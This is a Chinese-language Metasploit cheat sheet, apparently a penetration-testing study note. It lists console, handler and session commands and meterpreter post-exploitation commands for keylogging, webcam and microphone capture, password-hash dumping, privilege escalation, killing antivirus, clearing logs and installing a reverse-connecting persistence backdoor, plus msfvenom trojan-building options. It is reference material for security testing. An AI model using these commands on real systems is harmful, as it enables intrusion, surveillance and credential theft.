---
title: MetaSploit CheatSheet
categories: 渗透测试
tags:
  - 速查表
  - 学习笔记
  - 工具
abbrlink: 53382
date: 2019-05-24 14:42:30
---

<!--more-->

### 	介绍

[metasploit官网](<https://www.metasploit.com/>)

整理自多篇文章,参考链接在文章最后.

GUI工具:`armitage`

商业版有个web界面,但是不觉得命令行界面更cool吗?

类似工具[Cobalt Strike](<https://www.cobaltstrike.com/>)

msf主要有以下模块.

- 渗透攻击模块(Exploits)

- 辅助模块(Aux)

- 后渗透攻击模块(Post)

- 攻击载荷模块(Payloads)

- 空指令模块(Nops)

- 编码器模块(Encoders)

  ### 开始之前

```shell
# 使用前需要打开postgres数据库
service postgresql start

# 打开msf 控制台终端
msfconsole

# 初始化数据库
msfdb init

# 重新初始化数据库
msfdb reinit

# 查看数据库连接情况
db_status

# 建立数据库缓存
db_rebuild_cache

# 查看帮助文档
help
```

### 渗透阶段

其实就是挑选一个模块,然后傻瓜式操作

```shell
show exploits			# 查看所有可用的渗透攻击程序代码 

show auxiliary			# 查看所有可用的辅助攻击工具 

search [args]			# 查找需要的模块

info [args]				# 查看模块信息

use [args]				# 进入所选模块

show payloads			# 查看该模块适用的所有载荷代码 

show targets			# 查看该模块适用的攻击目标类型

show options			# 查看所有可用选项

show advanced			# 查看高级参数

set [args]				# 设置某个option参数

save					# 将当期配置保存

run						# 运行模块

back					# 回退
```



### options

```shell
# 简单介绍基本参数
LHOST			# 获取shell的本地ip

LPORT			# 获取shell的本机端口

RHOST			# 攻击目标的ip

LPORT			# 攻击目标的端口

PAYLOAD			# 指定payload

TARGET			# 指定目标主机类型
```

### handler

获取一个普通的shell 用nc就可以,但是要获取meterpreter就需要用到handle模块

```shell
use exploit/mulit/handler
set payload [PAYLOAD]
set lhost [LHOST]
set lport [LPORT]
run
```

### payloads

根据执行方式区分.payload分为:

- Singles - Singles非常小，旨在建立某种通讯，然后进入下一阶段。 例如，只是创建一个用户。
- Staged - 是一种攻击者用来将更大的文件上传到沦陷的系统的payload。
- Stages - Stages是由Stagers模块下载的payload组件。 各种payload stages提供高级功能，没有规模限制，如Meterpreter和VNC Injection。

根据连接方式区分,payload分为:

- bind - 在靶机上开放一个端口供攻击机连入
- reverse - 在本机上监听一个端口,靶机主动连接

根据功能区分,payload分为:

- shell  -  功能与系统的shell一样

- meterpreter  -  集成了很多强大的实用功能

- vnc injection  -  在目标上打开一个vnc,目标主机需安装vnc服务

  ## 后渗透阶段

### session 管理

```shell
seesions -l 			# 列出可用的session

sessions -d 			# 列出所有不活跃的session

sessions -i	[sessionId]	# 指定一个session

sessions -v				# 列出详细信息

sessions -c	[command]	# 指定一条命令,通过-i指定session

sessions -s [script]	# 在session中运行一个脚本,通过-i指定session

sessions -u	[sessionId]	# 将一个shell升级为metasploit shell

sessions -k	[sessionId]	# 杀死一个session

sessions -K				# 杀死所有session
```

### meterpreter

```shell
# 基本命令
background			# 让meterpreter处于后台模式

quit				# 退出session

shell				# 获取shell权限

irb					# 开启ruby终端

# 文件系统命令
getwd 				# 查看当前工作目录  

upload 				 # 上传文件到目标机上  

download 			# 下载文件到本机上  

edit 				# 编辑文件  

search  			# 搜索文件

# 网络命令 
ipconfig | ifconfig # 查看网络接口信息  

arp					# 查看arp表

route				# 查看路由

getproxy			# 获取代理

portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 
rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码
route 				# 获取路由表信息

# 系统命令
ps 							# 查看当前活跃进程 

migrate [pid] 				# 将Meterpreter会话移植到进程数位pid的进程中 

execute -H -i -f cmd.exe 	# 创建新进程cmd.exe，-H不可见，-i交互 

getpid 						# 获取当前进程的pid 

kill [pid] 					# 杀死进程 

getuid 						# 查看权限 

sysinfo 					# 查看目标机系统信息，如机器名，操作系统等 

shutdown					# 关机

# 实用功能
enumdesktops				# 用户登录数

keyscan_dump				# 键盘记录－下载

keyscan_start				# 键盘记录　－　开始

keyscan_stop				# 键盘记录　－　停止

uictl						# 获取键盘鼠标控制权

record_mic					# 音频录制

webcam_chat					# 查看摄像头接口

webcam_list					# 查看摄像头列表

webcam_stream				# 摄像头视频获取

getsystem					# 获取高权限

hashdump					# 下载账户hash

migrate						# 将自身注入到其他进程中

clearev						# 清除痕迹

screenshot					# 截屏


# run
run [scriptName|moudleName]				# 执行某个模块或脚本	

# 常用模块
run  persistence						# persistence 向目标主机注入后门程序
# run  persistence -X  -i  5  -p 4444  -r 172.17.11.18 
# -X 在目标主机上开机自启动
# -i 不断尝试反向连接的时间间隔

run metsvc 								# metsvc 注册服务

run packetrecorder						# 查看网络流量,-i 指定网卡

run get_local_subnets					# 获得本地网段

run getcountermeasure					# 显示HIPS和AV进程的列表，显示远程机器的防火墙规则，列出DEP和UAC策略

run scraper								# 获取网络共享信息

run killav								# 中止杀毒软件进程

run vnc									# 获得vnc远程桌面

run getgui  -e 							# 开启远程桌面 

run getgui -u example_username -p example_password # 添加账号
# 完整脚本列表在kali: /usr/share/metasploit-framework/scripts/meterpreter
```

```shell
# 常用模块
post/windows/gather/forensics/enum_drives	# 枚举存储器信息

post/windows/gather/checkvm					# 检查是否是虚拟机

post/windows/gather/enum_applications		# 获取目标主机上的软件安装信息

post/windows/gather/dumplinks				# 获取目标主机上最近访问过的文档、链接信息

post/windows/gather/enum_ie					# 读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码

post/windows/manage/killav 					# 关闭杀毒软件,可能导致蓝屏

post/windows/escalate/bypassuac				# 绕过uac

post/windows/gather/hashdump				# 获取系统hash

post/windows/manage/enable_rdp				# 开启远程桌面
```



### msfvenom

msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom可以生成木马程序

```shell
#msfvenom命令行选项
-p, --payload [payload]       	# 指定需要使用的payload(攻击荷载)

-l, --list [module_type]		# 列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all

-n, --nopsled [length]        	# 为payload预先指定一个NOP滑动长度

-f, --format [format]        	# 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)

-e, --encoder [encoder]       	# 指定需要使用的encoder（编码器）

-a, --arch [architecture]  		# 指定payload的目标架构

--platform   [platform]    		# 指定payload的目标平台

-s, --space [length]        	# 设定有效攻击荷载的最大长度

-b, --bad-chars [list]          # 设定规避字符集，比如: &#039;\x00\xff&#039;

-i, --iterations [count]        # 指定payload的编码次数

-c, --add-code [path]          	# 指定一个附加的win32 shellcode文件

-x, --template [path]          	# 指定一个自定义的可执行文件作为模板

-k, --keep                      # 保护模板程序的动作，注入的payload作为一个新的进程运行

--payload-options            	# 列举payload的标准选项

-o, --out [path]               	# 保存payload

-v, --var-name [name]           # 指定一个自定义的变量，以确定输出格式

--shellest                  	# 最小化生成payload

-h, --help                      # 查看帮助选项

--help-formats               	# 查看msf支持的输出格式列表
```



## 参考链接

[metasploit基础教程](<https://xz.aliyun.com/t/3007>)

[metasploit wiki](<https://github.com/rapid7/metasploit-framework/wiki>)

[后渗透阶段的meterpreter](<https://paper.seebug.org/29/>)

[meterpreter命令小结](<https://blog.csdn.net/qq_34450601/article/details/80207959>)

[Meterpreter命令详解](<https://www.cnblogs.com/backlion/p/9484949.html>)